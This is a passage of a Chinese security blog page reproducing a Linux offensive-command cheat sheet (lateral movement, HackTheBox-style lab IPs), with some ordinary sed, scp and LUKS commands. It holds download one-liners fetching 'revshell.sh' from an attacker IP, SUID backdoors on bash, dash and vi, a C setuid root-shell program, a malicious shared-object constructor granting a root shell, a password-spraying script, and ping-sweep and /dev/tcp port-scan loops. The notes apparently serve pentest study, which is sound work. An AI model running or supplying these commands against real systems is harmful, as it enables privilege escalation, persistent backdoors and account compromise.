while ($buffer = fread($fremote, BUFFER)) &#123; fwrite($flocal, $buffer); &#125; fclose($flocal); fclose($fremote);&#x27;      <br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| Python</span></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">## Python2</span></span><br>import urllib<br>urllib.urlretrieve (&quot;https://10.10.14.25/revshell.sh&quot;, &quot;revshell.sh&quot;)<br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">## Python3</span></span><br>import urllib.request<br>urllib.request.urlretrieve(&quot;https://10.10.14.25/revshell.sh&quot;, &quot;revshell.sh&quot;)<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| Ruby</span></span><br>ruby -e &#x27;require &quot;net/http&quot;; File.write(&quot;revshell.sh&quot;, Net::HTTP.get(URI.parse(&quot;https://10.10.14.25/revshell.sh&quot;)))&#x27;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| Perl</span></span><br>perl -e &#x27;use LWP::Simple; getstore(&quot;https://10.10.14.25/revshell.sh&quot;, &quot;revshell.sh&quot;);&#x27;<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>LUKS 安装&#x2F;<strong>卸载</strong>（<strong>Linux</strong>统一<strong>密钥设置</strong>）</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">------------------| Mount</span><br>sudo cryptsetup luksOpen backup.img backup<br>sudo mount /dev/mapper/backup /mnt/<br><span class="hljs-meta prompt_"> </span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">------------------| Unmount</span><br>sudo umount -l /mnt/<br>sudo cryptsetup luksClose backup <br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>有没有<code>PAM-Wordle</code>？</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">------------------| Find so file</span><br>find / 2&gt;/dev/null | grep wordle<br>find /&#123;usr,etc&#125; -type f -printf &quot;%T+ %p\n&quot; 2&gt;/dev/null | grep -v &#x27;000&#x27;| grep so$<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">------------------| Find words</span><br>strings &lt;file&gt;<br></code></pre></td></tr></table></figure>
+
+<h2 id="02-命令和脚本"><a href="#02-命令和脚本" class="headerlink" title="02.命令和脚本"></a>02.命令和脚本</h2><h3 id="02-1-命令"><a href="#02-1-命令" class="headerlink" title="02.1 命令"></a>02.1 命令</h3><ul>
+<li><a target="_blank" rel="noopener" href="https://youtu.be/_8FE3JZIPfo">将 Linux 机器设置为路由器</a>（将 OpenVpn 流量转发到 Windows 机器）</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">------------------| On Linux machine</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">## Check ip forwording is enabled</span></span> <br>sudo sysctl -a | grep ip_forward <br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># if the value is 1 you are good!! if not execute following command</span></span><br>sudo echo &quot;1&quot; &gt; /proc/sys/net/ipv4/ip_forward<br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">## IP Table rules</span></span><br>sudo iptables -A FORWARD -i tun0 -o eth0 -m state RELATED,ESTABLISHED -j ACCEPT<br>sudo iptables -A FORWARD -i eth0 -o tun0 -j ACCEPT<br>sudo iptables -t nat -A POSTROUTING -s &lt;eth0IP&gt;/24 -o tun0 -j MASQUERADE<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">------------------| On Windows machine</span><br>rout add 10.10.10.0 mask 255.255.254.0 &lt;linuxBox_eth0IP&gt;<br>ping 10.10.10.2<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>授予 SUID 至<code>dash</code>或<code>vi</code></li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo chmod u+s /bin/bash<br>sudo chmod u+s /bin/dash<br><br>sudo chmod 4755 $(which dash)<br><br>sudo cp /bin/dash /tmp/dash<br>sudo chmod 4555 /tmp/dash<br>sudo chown root /tmp/dash<br><br>/tmp/dash -p<br><br>sudo chmod 4755 $(readlink $(which vi))<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>通过 SSH 复制文件</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| Syntax</span></span><br>scp &lt;source&gt; &lt;destination&gt;<br><span class="hljs-meta prompt_"># </span><span class="language-bash">You can use /* to copy all</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| 要在登录到B时将文件从B复制到a，请执行以下操作：</span></span><br>scp /path/to/file username@a:/path/to/destination<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| 要在登录到a时将文件从B复制到a，请执行以下操作：</span></span><br>scp username@b:/path/to/file /path/to/destination<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| Alternates ---------------------</span></span><br>sudo apt-get install sshfs<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| Create an empty dir</span></span><br>mkdir /tmp/testdir <br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">## “链接”或“装载”这两个目录</span></span><br>sshfs user@server.com:/remote/dir /tmp/testdir <br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">## &quot;unlink&quot; the dirs</span></span><br>fusermount -u /home/user/testdir<br>umount mountpoint<br>diskutil unmount mountpoint<br></code></pre></td></tr></table></figure>
+
+<h3 id="02-2-端口敲门"><a href="#02-2-端口敲门" class="headerlink" title="02.2 端口敲门"></a>02.2 端口敲门</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| Files</span></span><br>ls /etc/init.d/ | grep knock<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| 使用上面的文件，我们可以找到配置文件</span></span><br>/etc/default/knockd<br>/etc/knockd.conf<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| 配置文件如下所示。要打开端口22，我们需要敲击端口571、290和991</span></span>     <br>[openSSH]<br> sequence = 571, 290, 911<br> seq_timeout = 5<br> start_command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT<br> tcpflags = syn<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| 使用nmap进行端口敲除</span></span><br>for i in 571 290 911; do nmap -Pn -p $i --host-timeout 201 --max-retries 0 10.10.10.43 ; done  <br></code></pre></td></tr></table></figure>
+
+<h3 id="02-3-脚本"><a href="#02-3-脚本" class="headerlink" title="02.3 脚本"></a>02.3 脚本</h3><ul>
+<li><a target="_blank" rel="noopener" href="https://youtu.be/jj4r5lwnCp8?t=1412">对用户进行密码喷洒</a></li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/bash</span><br><br>spray() &#123;<br>    users=$(awk -F: &#x27;&#123; if ($NF ~ /sh$/) print $1 &#125;&#x27; /etc/passwd)<br>    for user in $users; do<br>        echo &quot;$1&quot; |timeout 2 su $user -c whoami 2&gt;/dev/null<br>        if [[ $? -eq 0 ]]; then<br>            exit<br>        fi<br>    done<br>&#125;<br><br>spray $1<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>创建SUID sudo</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs shell">// gcc -o sroot sroot.c<br>int main(void)<br>&#123;<br>   setuid(0);<br>   setgid(0);<br>   printf(&quot;\n-----| by h4rithd.com |-----\n\n&quot;);<br>   system(&quot;/bin/bash -p&quot;);<br>&#125;<br><br>// chown root:root /tmp/sroot; chmod 4755 /tmp/sroot<br>// or chmod u+s /bin/bash<br><br>// SUID = 4xxx filename<br>// SGID = 2xxx filename<br>// Both = 6xxx filename<br><br>// for i in &#123;1..100&#125;; do ls -al /tmp/sroot;date ;sleep .2; done<br>// watch -n 2 -d ls -l .<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>过程监控器</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/bash</span><br><br>IFS=$&#x27;\n&#x27; # Loop by line<br><br>old_process=$(ps -eo command)<br><br>while true; do<br>    new_process=$(ps -eo command)<br>    diff &lt;(echo &quot;$old_process&quot;) &lt;(echo &quot;$new_process&quot;) | grep [\&lt;\&gt;]<br>    sleep 1<br>    old_process=$new_process<br>done<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">nano prcmon.sh</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">chmod</span> +x prcmon.sh; ./prcmon.sh</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>睡眠 5 的列表文件</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">for i in &#123;1..100&#125;; do ls -al /tmp/sroot;date ;sleep 5; done<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>平扫</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">for i in &#123;1..254&#125;; do (ping -c 1 172.19.0.$&#123;i&#125; | grep &quot;bytes from&quot; | grep -v &quot;Unreachable&quot; &amp;); done; <br></code></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/bash</span><br><br>ip=172.20.0<br><br>for i in $(seq 2 255);<br>do<br>    ping -c 1 -W 1 $ip.$i 1&gt;/dev/null 2&gt;&amp;1<br>    if [[ $? -eq 0 ]];<br>    then<br>        echo &quot;[+]  $ip.$i  - is Alive!&quot;<br>    fi<br>done<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>扫描实时端口</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">for port in &#123;1..65535&#125;; do echo &gt; /dev/tcp/172.19.0.1/$port &amp;&amp; echo &quot;$port open&quot;; done 2&gt;/dev/null       <br></code></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/bash</span><br><br>ip=127.0.0.1<br><br>for port in $(seq 1 65535);<br>do<br>    timeout .1 bash -c &quot;echo &gt; /dev/tcp/$ip/$port&quot; &amp;&amp;<br>        echo &quot;[+]  $ip : $port  - is Open!&quot;<br>done<br>echo &quot;==========[ Finished ]============&quot;<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>共享对象外壳 (.so)</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">include &lt;stdio.h&gt;</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">include &lt;stdlib.h&gt;</span><br><br>static void inject() __attribute__((constructor));<br><br>void inject() &#123;<br> system(&quot;cp /bin/bash /tmp/bash &amp;&amp; chmod +s /tmp/bash &amp;&amp; /tmp/bash -p&quot;);<br>&#125;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># gcc -shared -o libcounter.so -fPIC libcounter.c</span></span><br></code></pre></td></tr></table></figure>
+
+<h3 id="02-4-网络服务器"><a href="#02-4-网络服务器" class="headerlink" title="02.4 网络服务器"></a>02.4 网络服务器</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| Python</span></span><br>python2 -m SimpleHTTPServer 8080<br>python3 -m http.server 8080<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| Ruby</span></span><br>ruby -run -ehttpd . -p8080<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| PHP</span></span><br>php -S 0.0.0.0:8080<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| Socat</span></span><br>socat TCP-LISTEN:8080,reuseaddr,fork<br></code></pre></td></tr></table></figure>
+
+<h3 id="02-5-Sed命令"><a href="#02-5-Sed命令" class="headerlink" title="02.5 Sed命令"></a>02.5 Sed命令</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| Remove new line</span></span> <br>sed -z &#x27;s/\n//g&#x27; filename<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| Insert text to the 1st line of a file</span></span> <br>sed &#x27;1 i addthisword&#x27; filename<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| Delete first characher each line</span></span> <br>sed &#x27;s/^..//&#x27; filename<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| Delete last characher each line</span></span> <br>sed &#x27;s/.$//g&#x27; filename<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| Delete last line or footer line or trailer line</span></span><br>sed &#x27;$d&#x27; file<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| Delete particular line</span></span><br>sed &#x27;2d&#x27; file<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| Delete range of lines</span></span><br>sed &#x27;2,4d&#x27; file<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| Delete lines other than the first line or header line</span></span><br>sed &#x27;1!d&#x27; file<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| Delete lines other than last line or footer line</span></span><br>sed &#x27;$!d&#x27; file<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| Delete lines other than the specified range</span></span><br>sed &#x27;2,4!d&#x27; file<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| Delete first and last line</span></span><br>sed &#x27;1d;$d&#x27; file<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| Delete empty lines or blank lines</span></span><br>sed &#x27;/^$/d&#x27; file<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| Delete lines that begin with specified character</span></span><br>sed &#x27;/^u/d&#x27; file<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| Delete lines that end with specified character</span></span><br>sed &#x27;/x$/d&#x27; file<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| Delete lines that contain a pattern</span></span><br>sed &#x27;/debian/d&#x27; file<br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="category-chain-item">学习笔记</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Offensive-security/" class="print-no-link">#Offensive security</a>
+      
+        <a href="/tags/Common-Linux-commands/" class="print-no-link">#Common Linux commands</a>
+      
+        <a href="/tags/horizontal-movement/" class="print-no-link">#horizontal movement</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Linux常用命令-横向移动-h4rithd-2024.04.03版本</div>
+      <div>https://sh1yan.top/2024/06/02/Common-Linux-commands-horizontal-movement-h4rithd-20240403/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>shiyan</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年6月2日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/06/02/Active-Directory-Technical-Implementation-h4rithd-20240403/" title="活动目录-技术实现-h4rithd-2024.04.03版本">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">活动目录-技术实现-h4rithd-2024.04.03版本</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/06/02/Database-Offensive-Technology-h4rithd-20240509/" title="数据库攻防-h4rithd-2024.05.09版本">
+                        <span class="hidden-mobile">数据库攻防-h4rithd-2024.05.09版本</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a  rel="nofollow noopener"><span>Copyrights &copy; 2016-2024</span></a> <i class="iconfont icon-love"></i> <a  rel="nofollow noopener"><span>shiyan</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
